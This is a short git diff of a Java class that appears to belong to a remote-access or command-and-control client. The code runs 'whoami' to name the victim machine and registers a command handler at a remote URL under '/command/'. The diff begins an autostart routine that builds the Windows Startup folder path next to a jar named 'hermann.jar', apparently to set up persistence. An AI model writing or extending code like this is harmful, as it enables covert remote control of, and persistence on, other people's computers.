@@ -21,9 +21,7 @@ public class ConfigureInit {
     }
 
     public void configure(String url) {
-        GetContext.CLIENT_NAME = Console.execute("whoami")
-                .get(1)
-                .replace("\\", "-");
+        GetContext.CLIENT_NAME = Console.execute("whoami").get(1).replace("\\", "-");
         GetContext.SENDER = new Sender(url);
 
         webHandler = new WebHandler(url + "/command/" + GetContext.CLIENT_NAME);
@@ -32,6 +30,8 @@ public class ConfigureInit {
     }
 
     private void autostart() {
+        System.out.println(System.getProperty("user.dir") + "\\hermann.jar");
+        System.out.println(System.getProperty("java.io.tmpdir").replace("Local\\Temp\\", "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
     }
 
     public void operatingSystem() {
